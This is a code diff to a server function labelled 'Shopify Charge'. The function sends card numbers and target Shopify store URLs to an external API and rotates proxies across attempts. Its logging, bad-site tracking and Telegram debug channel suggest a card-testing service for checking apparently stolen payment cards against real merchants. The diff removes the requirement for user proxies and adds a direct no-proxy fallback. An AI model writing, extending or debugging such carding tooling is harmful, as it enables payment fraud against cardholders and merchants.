@@ -14,7 +14,9 @@ const SHOPIFY_DEBUG_CHAT_ID = "-1003848532661";
 
 const API_URL = "https://web-production-9db0.up.railway.app/shopify";
 const buildApiUrl = (cc: string, site: string, proxy: string) =>
-  `${API_URL}?cc=${encodeURIComponent(cc)}&site=${encodeURIComponent(site)}&proxy=${proxy}`;
+  proxy
+    ? `${API_URL}?cc=${encodeURIComponent(cc)}&site=${encodeURIComponent(site)}&proxy=${proxy}`
+    : `${API_URL}?cc=${encodeURIComponent(cc)}&site=${encodeURIComponent(site)}`;
 
 const badResponses = [
   "Site not supported",
@@ -459,23 +461,16 @@ Deno.serve(async (req) => {
     const triedSiteUrls: string[] = [];
     const badSiteUrls: { url: string; reason: string }[] = [];
 
-    // Get user's own proxies (required, 1-10)
-    const { data: userProxies, error: proxyError } = await adminClient
+    // Get user's own proxies (optional — API works without proxy)
+    const { data: userProxies } = await adminClient
       .from('user_proxies')
       .select('*')
       .eq('user_id', user.id);
 
-    if (proxyError || !userProxies || userProxies.length < 1) {
-      return new Response(JSON.stringify({ 
-        error: 'You must add at least 1 proxy before using Shopify Charge.', 
-        computedStatus: 'unknown' 
-      }), { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
-    }
+    // Shuffle proxies for rotation (empty array if none)
+    const shuffledProxies = [...(userProxies || [])].sort(() => Math.random() - 0.5);
 
-    // Shuffle proxies for rotation
-    const shuffledProxies = [...userProxies].sort(() => Math.random() - 0.5);
-    
-    const formatProxy = (p: typeof userProxies[0]) => 
+    const formatProxy = (p: { ip: string; port: string; username: string | null; password: string | null }) =>
       p.username && p.password ? `${p.ip}:${p.port}:${p.username}:${p.password}` : `${p.ip}:${p.port}`;
 
     let result: ApiCheckResult | null = null;
@@ -490,24 +485,30 @@ Deno.serve(async (req) => {
       triedSiteUrls.push(currentSite.url);
       console.log(`[SHOPIFY-CHARGE] Site attempt ${siteAttempt + 1}/${MAX_SITE_ATTEMPTS}: ${currentSite.url} (price: ${currentSite.price})`);
 
-      // Try proxies with rotation for this site
+      // Try proxies with rotation for this site (or fall back to no-proxy if user has none)
       const availableProxies = shuffledProxies.filter(p => !failedProxyIds.includes(p.id));
-      if (availableProxies.length === 0) {
+      const hadProxies = shuffledProxies.length > 0;
+      if (hadProxies && availableProxies.length === 0) {
         allProxiesDeadFlag = true;
         result = { status: 'unknown', message: 'All proxies failed (407)', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
         break;
       }
 
+      // If no user proxies configured, perform a single direct call (no proxy)
+      const proxyAttempts = availableProxies.length > 0
+        ? availableProxies
+        : [null as null | typeof shuffledProxies[0]];
+
       let siteResult: ApiCheckResult | null = null;
-      for (let proxyAttempt = 0; proxyAttempt < availableProxies.length; proxyAttempt++) {
-        const currentProxy = availableProxies[proxyAttempt];
-        const proxyStr = formatProxy(currentProxy);
-        console.log(`[SHOPIFY-CHARGE] Proxy ${proxyAttempt + 1}/${availableProxies.length}: ${currentProxy.ip}:${currentProxy.port}`);
-        
+      for (let proxyAttempt = 0; proxyAttempt < proxyAttempts.length; proxyAttempt++) {
+        const currentProxy = proxyAttempts[proxyAttempt];
+        const proxyStr = currentProxy ? formatProxy(currentProxy) : '';
+        console.log(`[SHOPIFY-CHARGE] Proxy ${proxyAttempt + 1}/${proxyAttempts.length}: ${currentProxy ? `${currentProxy.ip}:${currentProxy.port}` : 'none (direct)'}`);
+
         siteResult = await callApi(cc, currentSite.url, proxyStr);
-        
+
         // If proxy dead flag is set, remove proxy and try next
-        if (siteResult.proxyDead) {
+        if (siteResult.proxyDead && currentProxy) {
           console.log(`[SHOPIFY-CHARGE] Proxy dead detected, removing proxy ${currentProxy.id} (${currentProxy.ip}:${currentProxy.port})`);
           failedProxyIds.push(currentProxy.id);
           // Immediately delete from DB
@@ -614,7 +615,7 @@ Deno.serve(async (req) => {
       result = { status: 'unknown', message: 'All site attempts failed', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
     }
 
-    const allProxiesDead = allProxiesDeadFlag || failedProxyIds.length >= userProxies.length;
+    const allProxiesDead = allProxiesDeadFlag || (shuffledProxies.length > 0 && failedProxyIds.length >= shuffledProxies.length);
     const randomSite = usedSite;
 
     // Dead proxies already removed inline during the proxy loop above
